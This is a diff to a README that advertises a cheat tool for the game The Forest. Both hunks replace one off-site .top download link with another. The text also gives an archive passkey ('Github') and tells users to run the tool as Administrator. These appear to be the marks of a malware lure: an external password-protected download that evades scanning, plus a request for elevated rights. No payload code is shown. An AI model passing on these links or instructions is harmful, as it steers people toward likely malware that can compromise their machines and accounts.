@@ -6,7 +6,7 @@ The Forest hack with noclip, infinite health, stamina, item spawner, teleport, a
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -75,7 +75,7 @@ Based on popular mods like **Forest Trainer**, **WeMod**, and **FLiNG Trainer**.
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch The Forest.
 4. Run the hack **as Administrator**.
